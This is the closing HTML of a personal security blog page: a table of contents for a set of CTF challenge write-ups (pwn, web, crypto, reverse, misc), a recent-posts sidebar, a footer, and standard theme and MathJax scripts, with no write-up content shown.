href="#EXP-2"><span class="toc-number">2.4.6.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC-1"><span class="toc-number">2.4.7.</span> <span class="toc-text">上传脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tips"><span class="toc-number">2.4.8.</span> <span class="toc-text">tips</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%F0%9F%92%BC"><span class="toc-number">2.5.</span> <span class="toc-text">zip💼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-1"><span class="toc-number">2.5.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-3"><span class="toc-number">2.5.2.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome-cat-ctf%F0%9F%8E%89"><span class="toc-number">2.6.</span> <span class="toc-text">welcome_cat_ctf🎉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chao-%F0%9F%8C%BF"><span class="toc-number">2.7.</span> <span class="toc-text">chao 🌿</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.7.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.7.2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.7.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.7.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81-4"><span class="toc-number">2.7.5.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cat-of-magic%F0%9F%A7%99%E2%80%8D%E2%99%80%EF%B8%8F"><span class="toc-number">2.8.</span> <span class="toc-text">Cat of magic🧙‍♀️</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">2.8.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%B0%E5%9B%BE"><span class="toc-number">2.8.2.</span> <span class="toc-text">地图</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-js%F0%9F%90%A6"><span class="toc-number">3.1.</span> <span class="toc-text">ez_js🐦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cat-cat%F0%9F%98%BC"><span class="toc-number">3.2.</span> <span class="toc-text">Cat cat😼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E5%B0%9D%E8%AF%95"><span class="toc-number">3.2.1.</span> <span class="toc-text">信息收集与尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%A6%96%E9%A1%B5"><span class="toc-number">3.2.2.</span> <span class="toc-text">题目首页</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AF%BB%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.3.</span> <span class="toc-text">尝试读取系统文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81"><span class="toc-number">3.2.4.</span> <span class="toc-text">读取源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#app-py"><span class="toc-number">3.2.5.</span> <span class="toc-text">app.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.6.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1app-py"><span class="toc-number">3.2.7.</span> <span class="toc-text">审计app.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E9%83%A8%E5%88%86"><span class="toc-number">3.2.8.</span> <span class="toc-text">flag部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%83%A8%E5%88%86"><span class="toc-number">3.2.9.</span> <span class="toc-text">文件读取部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1cat-py"><span class="toc-number">3.2.10.</span> <span class="toc-text">审计cat.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8A%9F%E8%83%BD"><span class="toc-number">3.2.11.</span> <span class="toc-text">文件读取功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.12.</span> <span class="toc-text">使用方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.2.13.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96secret-key"><span class="toc-number">3.2.14.</span> <span class="toc-text">获取secret key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%A0%86%E6%A0%88%E5%88%86%E5%B8%83"><span class="toc-number">3.2.15.</span> <span class="toc-text">读取堆栈分布</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%AF%B9%E5%BA%94%E4%BD%8D%E7%BD%AE%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE"><span class="toc-number">3.2.16.</span> <span class="toc-text">读取对应位置内存数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0session"><span class="toc-number">3.2.17.</span> <span class="toc-text">伪造session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag"><span class="toc-number">3.2.18.</span> <span class="toc-text">一键获取flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">3.2.19.</span> <span class="toc-text">写在最后</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bypass%F0%9F%8D%A5"><span class="toc-number">3.3.</span> <span class="toc-text">ez_bypass🍥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-curl%F0%9F%94%97"><span class="toc-number">3.4.</span> <span class="toc-text">ez_curl🔗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wife%F0%9F%92%83"><span class="toc-number">3.5.</span> <span class="toc-text">wife💃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-challenge%F0%9F%92%AA"><span class="toc-number">3.6.</span> <span class="toc-text">web_challenge💪</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DDH-Game"><span class="toc-number">4.1.</span> <span class="toc-text">DDH_Game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">4.1.1.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">4.1.2.</span> <span class="toc-text">解法二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%9C%BA"><span class="toc-number">4.1.3.</span> <span class="toc-text">动机</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-theory"><span class="toc-number">4.2.</span> <span class="toc-text">cat_theory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">4.2.1.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%9C%BA-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">动机</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat%E2%80%99s-gift%F0%9F%8E%81"><span class="toc-number">4.3.</span> <span class="toc-text">cat’s gift🎁</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.3.2.</span> <span class="toc-text">后记</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%96%E8%8C%A8%E6%AF%94-can-you-tell-AES-from-blackbox%EF%BC%9F-sampl%E5%87%BA%E9%A2%98%E4%BA%BA%E5%89%8D%E8%A8%80"><span class="toc-number">4.4.</span> <span class="toc-text">盖茨比&amp;can you tell AES from blackbox？&amp;sampl出题人前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%96%E8%8C%A8%E6%AF%94"><span class="toc-number">4.5.</span> <span class="toc-text">盖茨比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mtp"><span class="toc-number">4.5.1.</span> <span class="toc-text">mtp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">4.5.2.</span> <span class="toc-text">爆破</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-you-tell-AES-from-blackbox%EF%BC%9F"><span class="toc-number">4.6.</span> <span class="toc-text">can you tell AES from blackbox？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sample"><span class="toc-number">4.7.</span> <span class="toc-text">sample</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">5.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CatFly%F0%9F%9B%AB%F0%9F%90%B1"><span class="toc-number">5.1.</span> <span class="toc-text">CatFly🛫🐱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReadingSection"><span class="toc-number">5.2.</span> <span class="toc-text">ReadingSection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#StupidOrangeCat2-xD"><span class="toc-number">5.3.</span> <span class="toc-text">StupidOrangeCat2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-cat-did-it"><span class="toc-number">5.4.</span> <span class="toc-text">The cat did it</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%92%8C%E8%A7%A3%E6%B3%95"><span class="toc-number">5.4.1.</span> <span class="toc-text">设计思路和解法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%AB%E7%8C%AB%E9%95%87%E6%A5%BC"><span class="toc-number">5.4.2.</span> <span class="toc-text">猫猫镇楼</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BugCat"><span class="toc-number">5.5.</span> <span class="toc-text">BugCat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">5.5.1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%96%B9%E6%A1%88"><span class="toc-number">5.5.2.</span> <span class="toc-text">二、解题方案</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC"><span class="toc-number">5.5.3.</span> <span class="toc-text">三、解题脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">6.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#catnim"><span class="toc-number">6.1.</span> <span class="toc-text">catnim</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">6.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#miao"><span class="toc-number">6.2.</span> <span class="toc-text">miao~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Peekaboo"><span class="toc-number">6.3.</span> <span class="toc-text">Peekaboo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MeowMeow"><span class="toc-number">6.4.</span> <span class="toc-text">MeowMeow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatFlag"><span class="toc-number">6.5.</span> <span class="toc-text">CatFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatPaw"><span class="toc-number">6.6.</span> <span class="toc-text">CatPaw</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8B%A5%E6%9C%89%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%AF%B9%E5%BA%94%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80"><span class="toc-number">6.6.1.</span> <span class="toc-text">1. 拥有小米手机，可以查看对应的符号布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AF%BB%E6%89%BE%E5%B0%8F%E7%B1%B3%E5%AE%89%E5%85%A8%E9%94%AE%E7%9B%98%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%B8%83%E5%B1%80"><span class="toc-number">6.6.2.</span> <span class="toc-text">2.寻找小米安全键盘的符号布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%90%88%E7%90%86%E7%8C%9C%E6%B5%8B"><span class="toc-number">6.6.3.</span> <span class="toc-text">3.合理猜测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%87%8D%E6%94%BE"><span class="toc-number">6.6.4.</span> <span class="toc-text">4.重放?</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatJump"><span class="toc-number">6.7.</span> <span class="toc-text">CatJump</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80-1"><span class="toc-number">6.7.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E7%81%B5%E6%84%9F%E6%9D%A5%E6%BA%90"><span class="toc-number">6.7.2.</span> <span class="toc-text">出题灵感来源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">6.7.3.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF1"><span class="toc-number">6.7.4.</span> <span class="toc-text">解题思路1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF2"><span class="toc-number">6.7.5.</span> <span class="toc-text">解题思路2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF3%EF%BC%88%E9%9D%9E%E9%A2%84%E6%9C%9F%EF%BC%89"><span class="toc-number">6.7.6.</span> <span class="toc-text">解题思路3（非预期）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatCat"><span class="toc-number">6.8.</span> <span class="toc-text">CatCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CatchCat"><span class="toc-number">6.9.</span> <span class="toc-text">CatchCat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nepnep-%E7%A5%9D%E4%BD%A0%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%E5%95%A6%EF%BC%81-xD"><span class="toc-number">6.10.</span> <span class="toc-text">Nepnep 祝你新年快乐啦！</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/31/Summary2024/" title="2024年终总结">2024年终总结</a><time datetime="2024-12-31T11:00:00.000Z" title="发表于 2024-12-31 19:00:00">2024-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/11/qwb2024_final_reverse/" title="强网杯S8决赛Reverse writeup">强网杯S8决赛Reverse writeup</a><time datetime="2024-12-11T05:00:00.000Z" title="发表于 2024-12-11 13:00:00">2024-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/qwb2024_final/" title="强网杯S8决赛pwn writeup">强网杯S8决赛pwn writeup</a><time datetime="2024-12-07T17:00:00.000Z" title="发表于 2024-12-08 01:00:00">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/24/WindowsDriver1/" title="windows驱动开发（1）——Windows驱动字符串">windows驱动开发（1）——Windows驱动字符串</a><time datetime="2024-11-24T15:00:00.000Z" title="发表于 2024-11-24 23:00:00">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/23/WindowsDriver0/" title="windows驱动开发（0）——Windows驱动开发的基础知识">windows驱动开发（0）——Windows驱动开发的基础知识</a><time datetime="2024-11-22T19:00:00.000Z" title="发表于 2024-11-23 03:00:00">2024-11-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By xia0ji233</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">welcome to my blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>